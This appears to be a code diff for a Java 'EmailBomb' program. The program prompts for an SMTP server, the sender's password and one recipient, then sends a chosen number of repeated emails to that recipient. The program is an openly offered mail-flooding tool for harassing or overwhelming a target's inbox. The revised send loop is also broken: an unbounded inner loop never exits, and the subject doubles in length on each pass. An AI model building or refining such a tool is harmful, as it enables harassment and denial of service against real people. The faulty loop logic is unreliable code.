@@ -7,22 +7,22 @@ public class Main {
     public static void main(String[] args) throws Exception {
         Scanner input = new Scanner(System.in);
         System.out.println("EmailBombV1 -.-.-.-.-");
-        System.out.println("Version 1.1");
+        System.out.println("Version 1.2");
         System.out.println("Made by Christina(YukitaRiko)");
         System.out.println("Github Package: https://github.com/Orangecat847/EmailBomb");
-        System.err.print("Please enter a SMTP Server: ");
+        System.out.print("Please enter a SMTP Server: ");
         String smtp_server = input.nextLine();
-        System.err.print("Please enter your Email: ");
+        System.out.print("Please enter your Email: ");
         String sender = input.nextLine();
-        System.err.print("Please enter your password: ");
+        System.out.print("Please enter your password: ");
         String password = input.nextLine();
-        System.err.print("Please enter the receiver: ");
+        System.out.print("Please enter the receiver: ");
         String receiver = input.nextLine();
-        System.err.print("What's the subject? ");
+        System.out.print("What's the subject? ");
         String subject = input.nextLine();
-        System.err.print("What's the text? ");
+        System.out.print("What's the text? ");
         String text = input.nextLine();
-        System.err.print("How many Emails Do you want to send: ");
+        System.out.print("How many Emails Do you want to send: ");
         int num = input.nextInt();
         Properties properties = new Properties();
         properties.put("mail.smtp.host", smtp_server);
@@ -37,16 +37,10 @@ public class Main {
         });
         session.setDebug(true);
         while (num > 0) {
-            if (subject.equals("/0")) {
-                Message message = new MimeMessage(session);
-                message.setFrom(new InternetAddress(sender));
-                message.setRecipient(Message.RecipientType.TO, new InternetAddress(receiver));
-                message.setSubject(subject + "/0");
-                message.setText(text);
-                Transport.send(message);
-                num -= 1;
-            }
-            else {
+            while (true) {
+                if (subject.equals("/0")) {
+                    subject += "/0";
+                }
                 Message message = new MimeMessage(session);
                 message.setFrom(new InternetAddress(sender));
                 message.setRecipient(Message.RecipientType.TO, new InternetAddress(receiver));
@@ -54,7 +48,15 @@ public class Main {
                 message.setText(text);
                 Transport.send(message);
                 num -= 1;
+                subject += subject;
             }
         }
+                Message message = new MimeMessage(session);
+                message.setFrom(new InternetAddress(sender));
+                message.setRecipient(Message.RecipientType.TO, new InternetAddress(receiver));
+                message.setSubject(subject);
+                message.setText(text);
+                Transport.send(message);
+                num -= 1;
     }
 }
